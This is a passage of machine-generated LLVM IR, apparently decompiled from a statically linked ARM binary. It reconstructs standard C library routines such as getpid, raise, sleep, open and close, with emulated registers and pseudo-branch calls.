  %v3_1432c = icmp uge i32 %v2_14328, %v1_1432c.pre
  store i1 %v3_1432c, i1* %cpsr_c.global-to-local, align 1
  %v9_1432c = icmp eq i32 %v2_14328, %v1_1432c.pre
  br i1 %v9_1432c, label %dec_label_pc_14334, label %dec_label_pc_1434c

dec_label_pc_14348:                               ; preds = %dec_label_pc_14334
  %v0_14348 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1434c

dec_label_pc_1434c:                               ; preds = %dec_label_pc_1431c, %dec_label_pc_14334.dec_label_pc_14328_crit_edge, %dec_label_pc_14348
  %v0_1434c = phi i32 [ %v0_14348, %dec_label_pc_14348 ], [ %v2_1432829, %dec_label_pc_1431c ], [ %v2_14328, %dec_label_pc_14334.dec_label_pc_14328_crit_edge ]
  %v1_1434c = phi i32 [ %v0_14348, %dec_label_pc_14348 ], [ 0, %dec_label_pc_1431c ], [ %v1_1432c.pre, %dec_label_pc_14334.dec_label_pc_14328_crit_edge ]
  %v3_1434c = icmp uge i32 %v0_1434c, %v1_1434c
  store i1 %v3_1434c, i1* %cpsr_c.global-to-local, align 1
  %v9_1434c = icmp eq i32 %v0_1434c, %v1_1434c
  br i1 %v9_1434c, label %dec_label_pc_14354, label %dec_label_pc_1434c.dec_label_pc_142cc_crit_edge

dec_label_pc_1434c.dec_label_pc_142cc_crit_edge:  ; preds = %dec_label_pc_1434c
  %v0_142d0.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_142cc

dec_label_pc_14354:                               ; preds = %dec_label_pc_1434c
  %v2_14354 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_14354, i32* %r4.global-to-local, align 4
  %v1_14358 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_14358

; uselistorder directives
  uselistorder i32 %v0_14348, { 1, 0 }
  uselistorder i32 %v1_1432c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_142dc.pre, { 2, 1, 0 }
  uselistorder i32 %v2_142d818, { 0, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 3, 5, 0, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 2, 4, 3, 1, 5, 7, 6, 0 }
  uselistorder i32 126, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1434c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14334, { 1, 0 }
  uselistorder label %dec_label_pc_1431c, { 1, 0 }
  uselistorder label %dec_label_pc_142fc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_142e4, { 1, 0 }
}

define i32 @__getpid(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1435c = load i32, i32* @r7, align 4
  store i32 %v3_1435c, i32* %stack_var_-8, align 4
  %v0_14360 = call i32 @__aeabi_read_tp()
  store i32 %v0_14360, i32* %r0.global-to-local, align 4
  %v1_14364 = add i32 %v0_14360, -1060
  %v2_14364 = inttoptr i32 %v1_14364 to i32*
  %v3_14364 = load i32, i32* %v2_14364, align 4
  %tmp7 = icmp slt i32 %v3_14364, 1
  br i1 %tmp7, label %dec_label_pc_14374, label %dec_label_pc_14398

dec_label_pc_14374:                               ; preds = %entry
  %v2_14368 = icmp eq i32 %v3_14364, 0
  br i1 %v2_14368, label %dec_label_pc_14378, label %dec_label_pc_14384

dec_label_pc_14378:                               ; preds = %dec_label_pc_14374
  %v1_14378 = add i32 %v0_14360, -1064
  %v2_14378 = inttoptr i32 %v1_14378 to i32*
  %v3_14378 = load i32, i32* %v2_14378, align 4
  store i32 %v3_14378, i32* %r0.global-to-local, align 4
  %v2_1437c = icmp eq i32 %v3_14378, 0
  br i1 %v2_1437c, label %bb, label %bb8

dec_label_pc_14384:                               ; preds = %dec_label_pc_14374
  br label %bb8

bb:                                               ; preds = %dec_label_pc_14378
  store i32 0, i32* %v2_14378, align 4
  %v0_14394.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb8

bb8:                                              ; preds = %dec_label_pc_14384, %dec_label_pc_14378, %bb
  %v0_14394 = phi i32 [ %v3_14378, %dec_label_pc_14378 ], [ %v0_14360, %dec_label_pc_14384 ], [ %v0_14394.pre, %bb ]
  br label %dec_label_pc_14398

dec_label_pc_14398:                               ; preds = %entry, %bb8
  %v0_14398 = phi i32 [ %v3_14364, %entry ], [ %v0_14394, %bb8 ]
  store i32 %v0_14398, i32* %r0.global-to-local, align 4
  %v2_1439c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1439c, i32* @r7, align 4
  ret i32 %v0_14398

; uselistorder directives
  uselistorder i32 %v0_14398, { 1, 0 }
  uselistorder i32 %v3_14364, { 1, 2, 0 }
  uselistorder label %dec_label_pc_14398, { 1, 0 }
  uselistorder label %bb8, { 2, 0, 1 }
}

define i32 @__GI_raise(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_143a4 = load i32, i32* @r4, align 4
  store i32 %v3_143a4, i32* %stack_var_-20, align 4
  %v0_143ac = call i32 @__aeabi_read_tp()
  store i32 %v0_143ac, i32* %r0.global-to-local, align 4
  %v1_143b0 = add i32 %v0_143ac, -1064
  %v2_143b0 = inttoptr i32 %v1_143b0 to i32*
  %v3_143b0 = load i32, i32* %v2_143b0, align 4
  store i32 %v3_143b0, i32* %r4.global-to-local, align 4
  %v2_143b4 = icmp eq i32 %v3_143b0, 0
  %v1_143bc = add i32 %v0_143ac, -1060
  %v2_143bc = inttoptr i32 %v1_143bc to i32*
  %v3_143bc = load i32, i32* %v2_143bc, align 4
  store i32 %v3_143bc, i32* %r0.global-to-local, align 4
  br i1 %v2_143b4, label %dec_label_pc_143c4, label %dec_label_pc_143d8

dec_label_pc_143c4:                               ; preds = %entry
  store i32 %v3_143bc, i32* %r4.global-to-local, align 4
  store i32 %v3_143bc, i32* %v2_143b0, align 4
  %v0_14400.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb28

dec_label_pc_143d8:                               ; preds = %entry
  %v5_143dc = icmp sgt i32 %v3_143bc, 0
  br i1 %v5_143dc, label %bb28, label %dec_label_pc_143e0

dec_label_pc_143e0:                               ; preds = %dec_label_pc_143d8
  %tmp = bitcast i32 %v3_143bc to float
  %tmp30 = call float @fabsf(float %tmp)
  %v1_143e0 = bitcast float %tmp30 to i32
  %v2_143e4 = icmp eq i32 %v1_143e0, 0
  br i1 %v2_143e4, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_143e0
  store i32 %v3_143b0, i32* %r0.global-to-local, align 4
  br label %bb28

.thread:                                          ; preds = %dec_label_pc_143e0
  %v2_143ec = sub i32 0, %v3_143bc
  store i32 %v2_143ec, i32* %r0.global-to-local, align 4
  br label %bb28

bb28:                                             ; preds = %bb, %dec_label_pc_143d8, %dec_label_pc_143c4, %.thread
  %v0_14404 = phi i32 [ %v3_143bc, %dec_label_pc_143d8 ], [ %v0_14400.pre, %dec_label_pc_143c4 ], [ %v3_143b0, %bb ], [ %v2_143ec, %.thread ]
  store i32 %v0_14404, i32* %r2.global-to-local, align 4
  %tmp31 = icmp ult i32 %v0_14404, -4095
  br i1 %tmp31, label %dec_label_pc_14428, label %dec_label_pc_14410

dec_label_pc_14410:                               ; preds = %bb28
  %v0_14414 = call i32 @__aeabi_read_tp()
  %v3_14418 = load i16, i16* @global_var_21d68.334, align 2
  %v4_14418 = sext i16 %v3_14418 to i32
  %v0_1441c = load i32, i32* %r2.global-to-local, align 4
  %v1_1441c = sub i32 0, %v0_1441c
  store i32 %v1_1441c, i32* %r2.global-to-local, align 4
  %v3_14420 = add i32 %v4_14418, %v0_14414
  %v4_14420 = inttoptr i32 %v3_14420 to i32*
  store i32 %v1_1441c, i32* %v4_14420, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14428

dec_label_pc_14428:                               ; preds = %bb28, %dec_label_pc_14410
  %v0_1442c = phi i32 [ %v0_14404, %bb28 ], [ -1, %dec_label_pc_14410 ]
  %v3_14428 = icmp eq i32 %v0_1442c, -1
  store i32 %v0_1442c, i32* %r5.global-to-local, align 4
  br i1 %v3_14428, label %dec_label_pc_14434, label %dec_label_pc_1447c

dec_label_pc_14434:                               ; preds = %dec_label_pc_14428
  %v0_14438 = call i32 @__aeabi_read_tp()
  store i32 %v0_14438, i32* %r0.global-to-local, align 4
  %v3_1443c = load i16, i16* @global_var_21d68.334, align 2
  %v4_1443c = sext i16 %v3_1443c to i32
  %v2_14440 = add i32 %v4_1443c, %v0_14438
  %v3_14440 = inttoptr i32 %v2_14440 to i32*
  %v4_14440 = load i32, i32* %v3_14440, align 4
  %v7_14444 = icmp eq i32 %v4_14440, 38
  br i1 %v7_14444, label %dec_label_pc_14450, label %dec_label_pc_14434.dec_label_pc_1447c_crit_edge

dec_label_pc_14434.dec_label_pc_1447c_crit_edge:  ; preds = %dec_label_pc_14434
  %v0_1447c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1447c

dec_label_pc_14450:                               ; preds = %dec_label_pc_14434
  %v0_14450 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_14450, i32* %r0.global-to-local, align 4
  %tmp32 = icmp ugt i32 %v0_14450, -4096
  br i1 %tmp32, label %bb29, label %.thread22

bb29:                                             ; preds = %dec_label_pc_14450
  %v5_14468 = sub i32 0, %v0_14450
  store i32 %v5_14468, i32* %r2.global-to-local, align 4
  %v7_1446c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_14474.509 to i32), i32 55540) to i32*), align 4
  %v4_14470 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v4_14470, i32* %r0.global-to-local, align 4
  %v7_14474 = add i32 %v7_1446c, %v0_14438
  %v8_14474 = inttoptr i32 %v7_14474 to i32*
  store i32 %v5_14468, i32* %v8_14474, align 4
  %v0_14478.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread22

.thread22:                                        ; preds = %dec_label_pc_14450, %bb29
  %v0_14478 = phi i32 [ %v0_14478.pre, %bb29 ], [ %v0_14450, %dec_label_pc_14450 ]
  store i32 %v0_14478, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1447c

dec_label_pc_1447c:                               ; preds = %dec_label_pc_14434.dec_label_pc_1447c_crit_edge, %dec_label_pc_14428, %.thread22
  %v0_1447c = phi i32 [ %v0_1447c.pre, %dec_label_pc_14434.dec_label_pc_1447c_crit_edge ], [ %v0_1442c, %dec_label_pc_14428 ], [ %v0_14478, %.thread22 ]
  store i32 %v0_1447c, i32* %r0.global-to-local, align 4
  %v2_14480 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_14480, i32* @r4, align 4
  ret i32 %v0_1447c

; uselistorder directives
  uselistorder i32 %v0_1447c, { 1, 0 }
  uselistorder i32 %v0_14450, { 1, 2, 0, 3 }
  uselistorder i32 %v0_14404, { 2, 0, 1 }
  uselistorder i32 %v3_143bc, { 2, 1, 0, 5, 4, 3, 6 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 0 }
  uselistorder i32 38, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 -1060, { 1, 0 }
  uselistorder i32 -1064, { 1, 0 }
  uselistorder label %dec_label_pc_1447c, { 2, 0, 1 }
  uselistorder label %.thread22, { 1, 0 }
  uselistorder label %dec_label_pc_14428, { 1, 0 }
  uselistorder label %bb28, { 3, 0, 1, 2 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %v3_14494 = load i32, i32* @r4, align 4
  %v6_14494 = load i32, i32* @r5, align 4
  %v9_14494 = load i32, i32* @r6, align 4
  %v12_14494 = load i32, i32* @r7, align 4
  %v15_14494 = load i32, i32* @lr, align 4
  store i32 0, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_144a4 = icmp eq i32 %arg1, 0
  store i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32* @r7, align 4
  store i32 %arg1, i32* %stack_var_-32, align 4
  br i1 %v2_144a4, label %dec_label_pc_144b8, label %dec_label_pc_1452c

dec_label_pc_144b8:                               ; preds = %entry
  %v0_144b8 = call i32 @__aeabi_read_tp()
  %v1_144bc = add i32 %v0_144b8, -1036
  %v2_144bc = inttoptr i32 %v1_144bc to i32*
  %v3_144bc = load i32, i32* %v2_144bc, align 4
  %v1_144c0 = and i32 %v3_144bc, -71
  %v2_144c4 = icmp ugt i32 %v1_144c0, 7
  store i1 %v2_144c4, i1* %cpsr_c.global-to-local, align 1
  %v7_144c4 = icmp eq i32 %v1_144c0, 8
  %v1_144c8 = add i32 %v0_144b8, -1168
  store i32 %v1_144c8, i32* @r5, align 4
  br i1 %v7_144c4, label %dec_label_pc_144d0, label %dec_label_pc_145a4

dec_label_pc_144d0:                               ; preds = %dec_label_pc_144b8
  %v2_144d4 = add i32 %v0_144b8, -624
  %v3_144d4 = inttoptr i32 %v2_144d4 to i32*
  store i32 -1, i32* %v3_144d4, align 4
  %v0_144d8 = load i32, i32* @r5, align 4
  %v1_144d8 = add i32 %v0_144d8, 132
  store i32 %v1_144d8, i32* @r6, align 4
  br label %dec_label_pc_144dc

dec_label_pc_144dc:                               ; preds = %dec_label_pc_14510.dec_label_pc_144dc_crit_edge, %dec_label_pc_144d0
  %v0_144e0 = phi i32 [ %v0_144e0.pre, %dec_label_pc_14510.dec_label_pc_144dc_crit_edge ], [ %v1_144d8, %dec_label_pc_144d0 ]
  %v0_144dc = phi i32 [ %v0_14518, %dec_label_pc_14510.dec_label_pc_144dc_crit_edge ], [ %v0_144d8, %dec_label_pc_144d0 ]
  %v1_144dc = add i32 %v0_144dc, 132
  %v2_144dc = inttoptr i32 %v1_144dc to i32*
  %v3_144dc = load i32, i32* %v2_144dc, align 4
  store i32 %v0_144e0, i32* %r2.global-to-local, align 4
  store i32 %v3_144dc, i32* @r4, align 4
  %v1_144ec30 = inttoptr i32 %v0_144e0 to i32*
  %v2_144ec31 = load i32, i32* %v1_144ec30, align 4
  %v3_144f033 = icmp uge i32 %v2_144ec31, %v3_144dc
  store i1 %v3_144f033, i1* %cpsr_c.global-to-local, align 1
  %v9_144f039 = icmp eq i32 %v2_144ec31, %v3_144dc
  br i1 %v9_144f039, label %dec_label_pc_144f8, label %dec_label_pc_14510

dec_label_pc_144f8:                               ; preds = %dec_label_pc_144dc, %dec_label_pc_144f8.dec_label_pc_144ec_crit_edge
  call void @__pseudo_branch(i32 -61504)
  %v0_14508 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_14508, label %dec_label_pc_1450c, label %dec_label_pc_144f8.dec_label_pc_144ec_crit_edge

dec_label_pc_144f8.dec_label_pc_144ec_crit_edge:  ; preds = %dec_label_pc_144f8
  %v0_144ec.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_144f0.pre = load i32, i32* @r4, align 4
  %v1_144ec = inttoptr i32 %v0_144ec.pre to i32*
  %v2_144ec = load i32, i32* %v1_144ec, align 4
  %v3_144f0 = icmp uge i32 %v2_144ec, %v1_144f0.pre
  store i1 %v3_144f0, i1* %cpsr_c.global-to-local, align 1
  %v9_144f0 = icmp eq i32 %v2_144ec, %v1_144f0.pre
  br i1 %v9_144f0, label %dec_label_pc_144f8, label %dec_label_pc_14510

dec_label_pc_1450c:                               ; preds = %dec_label_pc_144f8
  %v0_1450c = load i32, i32* @r4, align 4
  br label %dec_label_pc_14510

dec_label_pc_14510:                               ; preds = %dec_label_pc_144dc, %dec_label_pc_144f8.dec_label_pc_144ec_crit_edge, %dec_label_pc_1450c
  %v0_14510 = phi i32 [ %v0_1450c, %dec_label_pc_1450c ], [ %v2_144ec31, %dec_label_pc_144dc ], [ %v2_144ec, %dec_label_pc_144f8.dec_label_pc_144ec_crit_edge ]
  %v1_14510 = phi i32 [ %v0_1450c, %dec_label_pc_1450c ], [ %v3_144dc, %dec_label_pc_144dc ], [ %v1_144f0.pre, %dec_label_pc_144f8.dec_label_pc_144ec_crit_edge ]
  %v3_14510 = icmp uge i32 %v0_14510, %v1_14510
  store i1 %v3_14510, i1* %cpsr_c.global-to-local, align 1
  %v9_14510 = icmp eq i32 %v0_14510, %v1_14510
  br i1 %v9_14510, label %dec_label_pc_14518, label %dec_label_pc_14510.dec_label_pc_144dc_crit_edge

dec_label_pc_14510.dec_label_pc_144dc_crit_edge:  ; preds = %dec_label_pc_14510
  %v0_14518 = load i32, i32* @r5, align 4
  %v0_144e0.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_144dc

dec_label_pc_14518:                               ; preds = %dec_label_pc_14510
  %v0_14520 = load i32, i32* @r7, align 4
  %v2_14520 = add i32 %v0_14520, 116
  %v3_14520 = inttoptr i32 %v2_14520 to i32*
  %v4_14520 = load i32, i32* %v3_14520, align 4
  store i32 83244, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_14520)
  %v0_14534.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1452c

dec_label_pc_1452c:                               ; preds = %entry, %dec_label_pc_14518
  %v0_14534 = phi i32 [ 0, %entry ], [ %v0_14534.pre, %dec_label_pc_14518 ]
  %v2_14538 = ptrtoint i32* %stack_var_-60 to i32
  store i32 %v2_14538, i32* %r2.global-to-local, align 4
  store i32 65536, i32* %stack_var_-40, align 4
  %v3_14544 = call i32 @__libc_sigaction(i32 17, i32 %v0_14534, i32 %v2_14538)
  %v3_14548 = load i32, i32* %stack_var_-60, align 4
  %v2_1454c = icmp ne i32 %v3_14548, 0
  store i1 %v2_1454c, i1* %cpsr_c.global-to-local, align 1
  %v7_1454c = icmp eq i32 %v3_14548, 1
  br i1 %v7_1454c, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_1452c
  %v3_14550 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v3_14550, i32* %r2.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_1452c, %bb
  call void @__pseudo_cond_branch(i1 %v7_1454c, i32 ptrtoint (i32* @global_var_111f0.513 to i32))
  %v2_14560 = ptrtoint i32* %stack_var_-32 to i32
  %v2_14568 = call i32 @__libc_nanosleep(i32 %v2_14560, i32 %v2_14560)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1456c = icmp eq i32 %v2_14568, 0
  br i1 %v2_1456c, label %bb26, label %bb25

bb25:                                             ; preds = %.thread1
  store i32 0, i32* @r1, align 4
  store i32 499999999, i32* %r2.global-to-local, align 4
  %v3_14580 = load i32, i32* %stack_var_-32, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  br label %bb26

bb26:                                             ; preds = %.thread1, %bb25
  %storemerge = phi i32 [ %v3_14580, %bb25 ], [ 0, %.thread1 ]
  store i32 %storemerge, i32* @r4, align 4
  %v3_14590 = load i32, i32* %stack_var_-40, align 4
  %v1_14594 = and i32 %v3_14590, 65536
  store i32 %v1_14594, i32* %r2.global-to-local, align 4
  %v2_14594 = icmp eq i32 %v1_14594, 0
  br i1 %v2_14594, label %bb27, label %.thread5

bb27:                                             ; preds = %bb26
  %v3_1459c = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v3_1459c, i32* @r1, align 4
  br label %.thread5

.thread5:                                         ; preds = %bb26, %bb27
  call void @__pseudo_cond_branch(i1 %v2_14594, i32 ptrtoint (i32* @global_var_111f0.513 to i32))
  br label %dec_label_pc_145a4

dec_label_pc_145a4:                               ; preds = %dec_label_pc_144b8, %.thread5
  %v0_145a4 = load i32, i32* @r4, align 4
  store i32 %v3_14494, i32* @r4, align 4
  store i32 %v6_14494, i32* @r5, align 4
  store i32 %v9_14494, i32* @r6, align 4
  store i32 %v12_14494, i32* @r7, align 4
  store i32 %v15_14494, i32* @lr, align 4
  ret i32 %v0_145a4

; uselistorder directives
  uselistorder i32 %v0_1450c, { 1, 0 }
  uselistorder i32 %v1_144f0.pre, { 0, 2, 1 }
  uselistorder i32* %stack_var_-40, { 2, 0, 3, 1 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 3, 4, 6, 5, 0, 7, 8 }
  uselistorder i32 (i32, i32, i32)* @__libc_sigaction, { 1, 0, 2 }
  uselistorder label %dec_label_pc_145a4, { 1, 0 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_1452c, { 1, 0 }
  uselistorder label %dec_label_pc_14510, { 2, 1, 0 }
  uselistorder label %dec_label_pc_144f8, { 1, 0 }
}

define i32 @function_145b8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_145b8:
  %v0_145b8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_145b8, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_145b8
  %v2_145b8 = load i32, i32* @r4, align 4
  %v3_145c0 = load i32, i32* @sb, align 4
  %v8_145c0 = shl i32 %v2_145b8, %v3_145c0
  %v9_145c0 = and i32 %v8_145c0, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_145b8, %bb
  %v10_145c0 = phi i32 [ %arg1, %dec_label_pc_145b8 ], [ %v9_145c0, %bb ]
  ret i32 %v10_145c0

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__GI___close_nocancel() local_unnamed_addr {
entry:
  %v0_145d4 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_145d4, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_145d4 = load i32, i32* @r0, align 4
  ret i32 %v2_145d4

bb1:                                              ; preds = %entry
  %v0_145d8 = call i32 @__syscall_error()
  ret i32 %v0_145d8
}

define i32 @__GI___libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_145e4 = load i32, i32* @global_var_24f00.516, align 4
  %v2_145e8 = icmp eq i32 %v3_145e4, 0
  store i1 %v2_145e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_145e8, label %dec_label_pc_145f0, label %entry.dec_label_pc_1460c_crit_edge

entry.dec_label_pc_1460c_crit_edge:               ; preds = %entry
  %v3_1460c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1460c

dec_label_pc_145f0:                               ; preds = %entry
  %v0_145f0 = load i32, i32* @r7, align 4
  store i32 %v0_145f0, i32* @ip, align 4
  %v0_14600 = load i32, i32* @r0, align 4
  %v2_14600 = icmp ugt i32 %v0_14600, -4097
  %v7_14600 = icmp eq i32 %v0_14600, -4096
  store i1 %v7_14600, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14600, label %bb7, label %bb

bb:                                               ; preds = %bb9, %bb8, %dec_label_pc_1460c, %dec_label_pc_145f0
  %merge = phi i32 [ %v0_14600, %dec_label_pc_145f0 ], [ %v0_14630, %dec_label_pc_1460c ], [ %v0_14640, %bb8 ], [ %v6_14650, %bb9 ]
  ret i32 %merge

bb7:                                              ; preds = %dec_label_pc_145f0
  %v0_14608 = call i32 @__syscall_error()
  br label %dec_label_pc_1460c

dec_label_pc_1460c:                               ; preds = %entry.dec_label_pc_1460c_crit_edge, %bb7
  %v3_1460c = phi i32 [ %v3_1460c.pre, %entry.dec_label_pc_1460c_crit_edge ], [ %v0_14608, %bb7 ]
  %v9_1460c = load i32, i32* @r7, align 4
  store i32 %v9_1460c, i32* %stack_var_-8, align 4
  %v12_1460c = load i32, i32* @lr, align 4
  %v0_14610 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_14610, i32* @ip, align 4
  store i32 %v3_1460c, i32* @r7, align 4
  %v1_1462c = call i32 @__libc_disable_asynccancel(i32 %v0_14610)
  %v0_14630 = load i32, i32* @r7, align 4
  store i32 %v0_14630, i32* @r0, align 4
  %v2_14634 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14634, i32* @r7, align 4
  store i32 %v12_1460c, i32* @lr, align 4
  %v2_14638 = icmp ugt i32 %v0_14630, -4097
  %v7_14638 = icmp eq i32 %v0_14630, -4096
  store i1 %v7_14638, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14638, label %bb8, label %bb

bb8:                                              ; preds = %dec_label_pc_1460c
  %v0_14640 = call i32 @__syscall_error()
  %v0_14650 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14650, label %bb9, label %bb

bb9:                                              ; preds = %bb8
  %v1_14650 = load i32, i32* @r1, align 4
  %v2_14650 = load i32, i32* @r4, align 4
  %v5_14650 = mul i32 %v2_14650, 131072
  %v6_14650 = and i32 %v5_14650, %v1_14650
  br label %bb

; uselistorder directives
  uselistorder i32 %v0_14630, { 0, 2, 3, 1 }
  uselistorder i32 %v0_14600, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1460c, { 1, 0 }
}

define i32 @__GI___open_nocancel() local_unnamed_addr {
entry:
  %v0_14664 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_14664, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_14664 = load i32, i32* @r0, align 4
  ret i32 %v2_14664

bb1:                                              ; preds = %entry
  %v0_14668 = call i32 @__syscall_error()
  ret i32 %v0_14668
}

define i32 @__libc_open(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_14674 = load i32, i32* @global_var_24f00.516, align 4
  %v2_14678 = icmp eq i32 %v3_14674, 0
  store i1 %v2_14678, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14678, label %dec_label_pc_14680, label %entry.dec_label_pc_1469c_crit_edge

entry.dec_label_pc_1469c_crit_edge:               ; preds = %entry
  %v3_1469c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1469c

dec_label_pc_14680:                               ; preds = %entry
  %v0_14690 = load i32, i32* @r0, align 4
  %v2_14690 = icmp ugt i32 %v0_14690, -4097
  %v7_14690 = icmp eq i32 %v0_14690, -4096
  store i1 %v7_14690, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14690, label %bb10, label %bb

bb:                                               ; preds = %dec_label_pc_1469c, %bb11, %bb12, %dec_label_pc_14680
  %merge2 = phi i32 [ %v0_14690, %dec_label_pc_14680 ], [ %v0_146c0, %dec_label_pc_1469c ], [ %v0_146d0, %bb11 ], [ %v0_146d0, %bb12 ]
  ret i32 %merge2

bb10:                                             ; preds = %dec_label_pc_14680
  %v0_14698 = call i32 @__syscall_error()
  br label %dec_label_pc_1469c

dec_label_pc_1469c:                               ; preds = %entry.dec_label_pc_1469c_crit_edge, %bb10
  %v3_1469c = phi i32 [ %v3_1469c.pre, %entry.dec_label_pc_1469c_crit_edge ], [ %v0_14698, %bb10 ]
  store i32 %v3_1469c, i32* %stack_var_-24, align 4
  %v9_1469c = load i32, i32* @r2, align 4
  %v12_1469c = load i32, i32* @r3, align 4
  %v15_1469c = load i32, i32* @r7, align 4
  store i32 %v15_1469c, i32* %stack_var_-8, align 4
  %v18_1469c = load i32, i32* @lr, align 4
  %v0_146a0 = call i32 @__libc_enable_asynccancel()
  %v2_146a8 = load i32, i32* %stack_var_-24, align 4
  store i32 %tmp, i32* @r1, align 4
  store i32 %v9_1469c, i32* @r2, align 4
  store i32 %v12_1469c, i32* @r3, align 4
  store i32 %v2_146a8, i32* @r7, align 4
  %v1_146bc = call i32 @__libc_disable_asynccancel(i32 %v0_146a0)
  %v0_146c0 = load i32, i32* @r7, align 4
  store i32 %v0_146c0, i32* @r0, align 4
  %v2_146c4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_146c4, i32* @r7, align 4
  store i32 %v18_1469c, i32* @lr, align 4
  %v2_146c8 = icmp ugt i32 %v0_146c0, -4097
  %v7_146c8 = icmp eq i32 %v0_146c0, -4096
  store i1 %v7_146c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_146c8, label %bb11, label %bb

bb11:                                             ; preds = %dec_label_pc_1469c
  %v0_146d0 = call i32 @__syscall_error()
  %v0_146e0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_146e0, label %bb12, label %bb

bb12:                                             ; preds = %bb11
  %v3_146e0 = load i32, i32* @r1, align 4
  %v4_146e0 = inttoptr i32 %v3_146e0 to i32*
  store i32 %v0_146d0, i32* %v4_146e0, align 4
  %v5_146e0 = load i32, i32* @r4, align 4
  %v6_146e0 = load i32, i32* @r1, align 4
  %v7_146e0 = sub i32 %v6_146e0, %v5_146e0
  store i32 %v7_146e0, i32* @r1, align 4
  br label %bb

; uselistorder directives
  uselistorder i32 %v0_146d0, { 2, 1, 0 }
  uselistorder i32 %v0_146c0, { 0, 2, 3, 1 }
  uselistorder i32 %v0_14690, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1469c, { 1, 0 }
  uselistorder label %bb, { 2, 1, 0, 3 }
}

define i32 @__GI___write_nocancel() local_unnamed_addr {
entry:
